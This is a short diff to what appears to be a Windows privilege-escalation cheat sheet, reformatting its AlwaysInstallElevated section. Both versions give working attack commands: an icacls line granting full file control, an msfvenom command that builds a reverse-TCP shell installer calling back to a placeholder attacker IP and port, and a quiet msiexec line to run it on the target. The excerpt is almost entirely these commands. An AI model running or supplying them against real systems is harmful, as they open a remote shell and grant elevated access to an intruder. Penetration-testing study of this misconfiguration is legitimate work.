@@ -48,12 +48,17 @@ icacls <file> /grant <user>:F
 
 AlwaysInstallElevated
 
-```
+```shell
 # AlwaysInstallElevated set to 1 in HKLM!
 # AlwaysInstallElevated set to 1 in HKCU! 
 # using msfvenom to create payload
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f msi -o reverse.msi
-# execute <payload> = reverse.msi
+```
+
+execute the command on the target
+
+```powershell
+# <payload> = reverse.msi
 msiexec /quiet /qn /i <payload>
 ```
 
